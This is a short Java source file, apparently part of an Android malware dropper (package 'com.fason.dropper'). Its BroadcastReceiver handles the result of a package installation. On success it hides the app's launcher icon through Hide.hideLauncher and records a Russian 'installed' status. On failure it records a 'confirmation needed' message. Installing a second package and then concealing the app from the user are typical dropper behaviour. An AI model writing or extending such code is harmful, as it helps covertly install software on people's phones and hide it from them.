package com.fason.dropper;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageInstaller;

public class InstallReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context ctx, Intent intent) {
        int status = intent.getIntExtra(PackageInstaller.EXTRA_STATUS, -1);
        if (status == PackageInstaller.STATUS_SUCCESS) {
            DropState.msg = "Установлено";
            Hide.hideLauncher(ctx);
        } else {
            DropState.error = intent.getStringExtra(PackageInstaller.EXTRA_STATUS_MESSAGE);
            DropState.msg = "Нужно подтверждение";
        }
    }
}
